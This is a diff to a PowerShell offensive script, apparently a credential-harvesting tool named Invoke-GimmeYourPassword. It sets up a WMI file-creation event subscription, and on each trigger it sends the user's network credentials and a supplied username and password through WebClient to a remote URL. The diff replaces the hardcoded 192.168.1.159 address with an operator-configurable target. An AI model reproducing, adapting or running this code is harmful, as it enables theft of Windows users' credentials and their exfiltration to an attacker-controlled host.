@@ -85,14 +85,14 @@ function start-tempsubscription{
         [string]$pathToMonitorPathRemainder,
         [string]$URL
     )
-    $Target="http://$URL"
+    $global:Target="http://$URL"
     write-output $target
     $localComputerName=$env:COMPUTERNAME
     $query = ("Select * from __instanceCreationEvent within 10 Where targetinstance isa 'cim_datafile' and targetInstance.drive='$pathToMonitorDriverLetter' and targetInstance.Path='$pathToMonitorPathRemainder' and targetInstance.__server='$env:computername'  and not targetInstance.Filename LIKE '~$%'")
     $action = {
 	$global:MyEVT=$event
     write-host  "Event Occurred" 
-	write-host $Target
+	
     
     $modFileName=$event.sourceEventArgs.newevent.TargetInstance.filename
     $modExtension=$event.sourceEventArgs.newevent.TargetInstance.extension
@@ -108,8 +108,8 @@ function start-tempsubscription{
         $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
         $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
         $wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
-        #$result=$wc.downloadstring("$Target");
-        $result=$wc.downloadstring('http://192.168.1.159');
+        $result=$wc.downloadstring("$Target");
+        #$result=$wc.downloadstring('http://192.168.1.159');
         }
     
   }
@@ -119,10 +119,10 @@ function start-tempsubscription{
     function Invoke-GimmeYourPassword {
 	param (
         [Parameter(Mandatory=$True)]
-		[string]$Destination
+		[string]$URL
     )
 	write-host $destination
     Unregister-Event -SourceIdentifier MonitorFiles3
     $pathToMonitor=search-keys -Invoke
-    start-tempsubscription -pathToMonitorDriverLetter $pathToMonitor[0] -pathToMonitorPathRemainder $pathToMonitor[1] -URL $destination
+    start-tempsubscription -pathToMonitorDriverLetter $pathToMonitor[0] -pathToMonitorPathRemainder $pathToMonitor[1] -URL $URL
    }
